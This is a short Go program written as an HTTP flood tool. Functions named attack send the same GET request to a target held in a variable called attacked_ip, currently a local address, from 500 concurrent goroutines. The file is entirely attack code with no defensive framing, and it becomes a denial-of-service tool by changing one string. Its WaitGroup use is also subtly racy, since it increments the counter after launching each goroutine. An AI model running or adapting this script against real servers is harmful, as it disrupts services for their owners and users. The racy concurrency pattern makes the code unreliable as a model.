package main

import (
	"fmt"
	"net/http"
	"sync"
)

var attacked_ip = "http://0.0.0.0:8080"

func create_request(attacked_ip string) (*http.Request, error) {
	req, err := http.NewRequest("GET", attacked_ip, nil)
	if err != nil {
		println(err)
		return nil, err
	}
	return req, nil
}
func attack(req http.Request, wg *sync.WaitGroup) {
	defer wg.Done()
	resp, err := http.DefaultClient.Do(&req)
	if err != nil {
		fmt.Println("error")
		return
	}
	defer resp.Body.Close()
	fmt.Println(resp.Status)

}
func main() {

	req, err := create_request(attacked_ip)
	if err != nil {
		fmt.Println(err)
		return
	}

	var wg sync.WaitGroup
	for i := 0; i < 500; i++ {
		go attack(*req, &wg)
		wg.Add(1)
	}
	wg.Wait()
}
